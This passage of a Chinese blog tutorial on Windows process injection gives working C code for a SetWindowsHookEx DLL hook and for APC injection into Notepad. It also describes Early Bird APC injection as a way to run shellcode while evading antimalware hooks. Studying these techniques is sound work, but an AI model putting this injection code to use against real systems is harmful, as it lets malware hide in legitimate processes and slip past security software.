</span>&#123;<br>    DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>    PROCESSENTRY32 P32; <span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>    <span class="hljs-comment">// 获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>    HANDLE hSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-comment">// 使用 C++ 的 iostream 进行错误输出</span><br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取进程快照失败，请检查原因。错误码: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回0表示失败</span><br>    &#125;<br><br>    P<span class="hljs-number">32.</span>dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br><br>    <span class="hljs-comment">// 获取快照中第一个进程信息</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Process32First</span>(hSnapshot, &amp;P32)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取第一个进程信息失败。错误码: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hSnapshot);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">// 比较进程名。lstrcmp 是 Windows API 函数，用于比较字符串。</span><br>        <span class="hljs-comment">// 在 C++ 中，也可以使用 std::strcmp 或 C 风格字符串的比较。</span><br>        <span class="hljs-comment">// 这里为了保持与原代码的逻辑一致性，继续使用 lstrcmp。</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">lstrcmp</span>(P<span class="hljs-number">32.</span>szExeFile, lpProcessName)) &#123;<br>            ret = P<span class="hljs-number">32.</span>th32ProcessID; <span class="hljs-comment">// 匹配成功，记录PID</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(hSnapshot, &amp;P32)); <span class="hljs-comment">// 检索有关系统快照中记录的下一个进程的信息。</span><br><br>    <br>    <span class="hljs-built_in">CloseHandle</span>(hSnapshot); <span class="hljs-comment">// 关闭句柄</span><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-function">DWORD <span class="hljs-title">GetFirstProcessThreadTID</span><span class="hljs-params">(DWORD processId)</span> </span>&#123;<br>    DWORD firstTID = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的第一个线程TID，初始为0（未找到）</span><br><br>    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;<br>    THREADENTRY32 te32; <span class="hljs-comment">// 结构体，用于存储线程快照信息</span><br><br>    <span class="hljs-comment">// 获取所有线程的快照</span><br>    hThreadSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (hThreadSnap == INVALID_HANDLE_VALUE) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取线程快照失败，请检查原因。错误码: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回0表示失败</span><br>    &#125;<br><br>    <span class="hljs-comment">// 在使用 THREADENTRY32 结构体之前，必须设置其 dwSize 成员</span><br>    te<span class="hljs-number">32.</span>dwSize = <span class="hljs-built_in">sizeof</span>(THREADENTRY32);<br><br>    <span class="hljs-comment">// 检索系统中第一个线程的信息</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Thread32First</span>(hThreadSnap, &amp;te32)) &#123;<br>        std::cerr &lt;&lt; <span class="hljs-string">&quot;获取第一个线程信息失败。错误码: &quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;<br>        <span class="hljs-built_in">CloseHandle</span>(hThreadSnap);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 返回0表示失败</span><br>    &#125;<br><br>    <span class="hljs-comment">// 遍历所有线程，查找属于指定进程的线程</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (te<span class="hljs-number">32.</span>th32OwnerProcessID == processId) &#123;<br>            firstTID = te<span class="hljs-number">32.</span>th32ThreadID; <span class="hljs-comment">// 匹配成功，记录TID</span><br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 找到第一个就退出循环</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Thread32Next</span>(hThreadSnap, &amp;te32)); <span class="hljs-comment">// 检索有关系统快照中记录的下一个线程的信息。</span><br><br>    <span class="hljs-built_in">CloseHandle</span>(hThreadSnap); <span class="hljs-comment">// 关闭句柄</span><br>    <span class="hljs-keyword">return</span> firstTID;<br>&#125;<br><br><br><br><br>HHOOK hHook=<span class="hljs-literal">NULL</span>;<br>HINSTANCE hInst = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">HookProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;<br><br> <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(hHook, nCode, wParam, lParam);<span class="hljs-comment">//给下一个钩子或者应用程序继续处理消息</span><br><br><br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Hookstart</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> pid = <span class="hljs-built_in">GetProcessPID</span>(<span class="hljs-string">&quot;Notepad.exe&quot;</span>);<br>   <span class="hljs-type">int</span> tid= <span class="hljs-built_in">GetFirstProcessThreadTID</span>(pid);<br>   <span class="hljs-keyword">if</span> (tid == <span class="hljs-number">0</span>) &#123;<br>       <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;没有找到线程&quot;</span>, <span class="hljs-string">&quot;错误&quot;</span>, MB_OK);<br>       <span class="hljs-keyword">return</span>;<br>   &#125;<br>    hHook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, HookProc, hInst, tid);<br><br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> _declspec(dllexport) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Hookstop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 卸载钩子</span><br>    <span class="hljs-keyword">if</span> (hHook) &#123;<br>        <span class="hljs-built_in">UnhookWindowsHookEx</span>(hHook);<br>    &#125;<br>    <br>&#125;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        hInst=hModule;<br>        <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;yawataa&quot;</span>, <span class="hljs-string">&quot;yawataa&quot;</span>, MB_OK);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>测试的时候将notepad.exe开启，当点击添加新页面或者是关掉notepad时就会弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031618172.png" alt="image-20251003161838095"></p><h1 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h1><h2 id="APC的介绍"><a href="#APC的介绍" class="headerlink" title="APC的介绍"></a>APC的介绍</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>APC的中文名为为异步过程调用，APC是一个链状的数据结构，可以让一个线程在其本应该执行步骤前执行其他代码。每个线程都维护一个APC链。当线程从等待状态苏醒后，会自动检测自己的APC队列中是否存在APC过程，所以只需要将目标进程的线程的APC队列里面添加APC过程，当然为了提高注入成功率可以向所有线程里面添加APC过程，然后促使线程从休眠中恢复就可以实现注入。</p><p>(让线程进入可警告状态的函数 SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsEx、 </p><p>WaitForMultipleObjectsEx或WaitForSingleObjectEx函数)</p><h2 id="APC注入的一些前置知识"><a href="#APC注入的一些前置知识" class="headerlink" title="APC注入的一些前置知识"></a>APC注入的一些前置知识</h2><p>1.线程会在进程内执行</p><p>2.线程会调用APC队列中的函数</p><p>3.应用可以给特定的线程的APC队列中压入函数(有权限控制)</p><p>4.压入队列后，线程将按照顺序优先级执行</p><p>5.这种技术的缺点是只有当线程处于alertable状态时才会去执行这些APC函数</p><h2 id="APC的本质"><a href="#APC的本质" class="headerlink" title="APC的本质"></a>APC的本质</h2><p>线程是不能被杀掉、挂起、恢复的，线程在执行的时候自己占据着CPU，别人怎么可能控制它呢？ </p><p>举个极端的例子：如果不调用API，屏蔽中断，并保证代码不出现异常，线程将永久占用CPU。所以说线 </p><p>程如果想死，一定是自己执行代码把自己杀死，不存在他杀这种情况。那如果想改变一个线程的行为该 </p><p>怎么办呢？可以给他提供一个函数，让它自己去调用，这个函数就是APC(Asyncroneus Procedure </p><p>Call)，即异步过程调用</p><p>相当于就是，在线程在占用的时候，我们可以往他的APC队列中插入一个删除的函数，然后使用SleepEx、SignalObjectAndWait、MsgWaitForMultipleObjectsExWaitForMultipleObjectsEx或WaitForSingleObjectEx函数 这些函数 让其进入可警告状态，恢复线程的时候就会执行APC队列中的删除函数</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>思路</p><ol><li><p>OpenProcess 打开进程 </p></li><li><p>VirtualAlloc 申请空间 </p></li><li><p>WriteProcessMemory 写入dll信息</p></li></ol><p>4.根据进程对应的线程id打开线程 </p><p>5.使用 QueueUserApc 插入执行</p><p>代码</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br>DWORD GetProcessPID(<span class="hljs-type">char</span>* lpProcessName) &#123;<br><br>DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br><span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>HANDLE IpSnashot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>printf(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>, GetLastError());<br>&#125;<br>P32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br>Process32First(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (!lstrcmp(P32.szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>ret = P32.th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (Process32Next(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>CloseHandle(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-comment">//提权函数(注入到线程需要权限)</span><br><span class="hljs-type">BOOL</span> EnableDebugPrivilege() &#123;<br>HANDLE hToken;<br><span class="hljs-type">BOOL</span> fok;<br><span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;<br>TOKEN_PRIVILEGES tp;<br>tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>AdjustTokenPrivileges(hToken, <span class="hljs-literal">FALSE</span>, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>fok = (GetLastError() == ERROR_SUCCESS);<br>CloseHandle(hToken);<br><br><br><br><br>&#125;<br><span class="hljs-keyword">return</span> fok;<br><br><br><br>&#125;<br><span class="hljs-type">BOOL</span> ApcInjectDll(DWORD dwPid, <span class="hljs-type">char</span>* pszDllName) &#123;<br><br>EnableDebugPrivilege();<br><span class="hljs-comment">//1.打开进程获取进程句柄</span><br>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, dwPid);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>printf(<span class="hljs-string">&quot;openProcess erro! ;&quot;</span>, GetLastError());<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><br><br>&#125;<br><span class="hljs-comment">//2.申请内存空间</span><br><span class="hljs-type">int</span> nsize = strlen(pszDllName);<br>LPVOID PDDLaddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, nsize, MEM_COMMIT, PAGE_READWRITE);<br><br><span class="hljs-comment">//3. WriteProcessMemory 写入dll信息 </span><br>SIZE_T wWrittenSize = <span class="hljs-number">0</span>;<br>WriteProcessMemory(hProcess, PDDLaddr, pszDllName, nsize, &amp;wWrittenSize);<br><span class="hljs-comment">//4.获取到Loadlibary地址，等会加载dll</span><br>HMODULE hmod = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>FARPROC pFuncAddr = GetProcAddress(hmod, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><span class="hljs-comment">//5.给进程的每一个线程都注入APC序列确保能执行成功</span><br>THREADENTRY32 te = &#123; <span class="hljs-number">0</span> &#125;;<br>te.dwSize = <span class="hljs-keyword">sizeof</span>(te);<br><br>HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br>DWORD dwRet = <span class="hljs-number">0</span>;<br>HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">if</span> (Thread32First(hSnap, &amp;te)) &#123;<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (te.th32OwnerProcessID == dwPid) &#123;<br>hThread = OpenThread(THREAD_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, te.th32ThreadID);<br><span class="hljs-keyword">if</span> (hThread) &#123;<br><span class="hljs-comment">//往APC队列中插入Load；ibary函数 参数为PDDLadd</span><br>dwRet = QueueUserAPC((PAPCFUNC)pFuncAddr, hThread, (ULONG_PTR)PDDLaddr);<br>hThread = <span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (Thread32Next(hSnap, &amp;te));<br>&#125;<br><br>CloseHandle(hThread);<br>CloseHandle(hProcess);<br>CloseHandle(hSnap);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br><br>&#125;<br><span class="hljs-type">int</span> main()<br>&#123;<br><span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br>pid = GetProcessPID(<span class="hljs-string">&quot;Notepad.exe&quot;</span>);<br><span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>printf(<span class="hljs-string">&quot;未找到进程&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">char</span>* dll_path = <span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\\Release\\yawatadll.dll&quot;</span>;<br><br><br><span class="hljs-keyword">if</span> (ApcInjectDll(pid, dll_path)) &#123;<br>printf(<span class="hljs-string">&quot;注入成功&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031635112.png" alt="image-20251003163526790"></p><h2 id="Early-Bird-APC注入的衍生"><a href="#Early-Bird-APC注入的衍生" class="headerlink" title="(Early Bird)APC注入的衍生"></a>(Early Bird)APC注入的衍生</h2><p>Early Bird是一种简单而强大的技术，Early Bird本质上是一种APC注入与线程劫持的变体，由于线程初始化时会调用ntdll未导出函数NtTestAlert，该函数会清空并处理APC队列，所以注入的代码通常在进程的主线程的入口点之前运行并接管进程控制权，从而避免了反恶意软件产品的钩子的检测，同时获得一个合法进程的环境信息。</p><p>[<a href="https://bbs.kanxue.com/thread-285748.htm">原创]APC与Early Bird注入-编程技术-看雪论坛-安全社区|非营利性质技术交流社区</a></p><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><ol><li>创建一个挂起的进程(通常是windows的合法进程)</li><li>在挂起的进程内申请一块可读可写可执行的内存空间</li><li>往申请的空间内写入shellcode</li><li>将APC插入到该进程的主线程</li><li>恢复挂起进程的线程</li></ol><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br>DWORD GetProcessPID(<span class="hljs-type">char</span>* lpProcessName) &#123;<br><br>DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br><span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>HANDLE IpSnashot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>printf(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>, GetLastError());<br>&#125;<br>P32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br>Process32First(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (!lstrcmp(P32.szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>ret = P32.th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (Process32Next(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>CloseHandle(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-comment">//提权函数(注入到线程需要权限)</span><br><span class="hljs-type">BOOL</span> EnableDebugPrivilege() &#123;<br>HANDLE hToken;<br><span class="hljs-type">BOOL</span> fok;<br><span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123;<br>TOKEN_PRIVILEGES tp;<br>tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tp.Privileges[<span class="hljs-number">0</span>].Luid);<br>tp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>AdjustTokenPrivileges(hToken, <span class="hljs-literal">FALSE</span>, &amp;tp, <span class="hljs-keyword">sizeof</span>(tp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>fok = (GetLastError() == ERROR_SUCCESS);<br>CloseHandle(hToken);<br><br><br><br><br>&#125;<br><span class="hljs-keyword">return</span> fok;<br><br><br><br>&#125;<br><span class="hljs-type">BOOL</span> ApcInjectDll(DWORD dwPid, <span class="hljs-type">char</span>* pszDllName) &#123;<br><br>EnableDebugPrivilege();<br><span class="hljs-comment">//1.打开进程获取进程句柄</span><br>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, dwPid);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>printf(<span class="hljs-string">&quot;openProcess erro! ;&quot;</span>, GetLastError());<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><br><br>&#125;<br><span class="hljs-comment">//2.申请内存空间</span><br><span class="hljs-type">int</span> nsize = strlen(pszDllName);<br>LPVOID PDDLaddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, nsize, MEM_COMMIT, PAGE_READWRITE);<br><br><span class="hljs-comment">//3. WriteProcessMemory 写入dll信息 </span><br>SIZE_T wWrittenSize = <span class="hljs-number">0</span>;<br>WriteProcessMemory(hProcess, PDDLaddr, pszDllName, nsize, &amp;wWrittenSize);<br><span class="hljs-comment">//4.获取到Loadlibary地址，等会加载dll</span><br>HMODULE hmod = GetModuleHandleA(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>FARPROC pFuncAddr = GetProcAddress(hmod, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><span class="hljs-comment">//5.给进程的每一个线程都注入APC序列确保能执行成功</span><br>THREADENTRY32 te = &#123; <span class="hljs-number">0</span> &#125;;<br>te.dwSize = <span class="hljs-keyword">sizeof</span>(te);<br><br>HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hSnap == INVALID_HANDLE_VALUE) &#123;<br><span class="hljs-keyword">return</span> <span 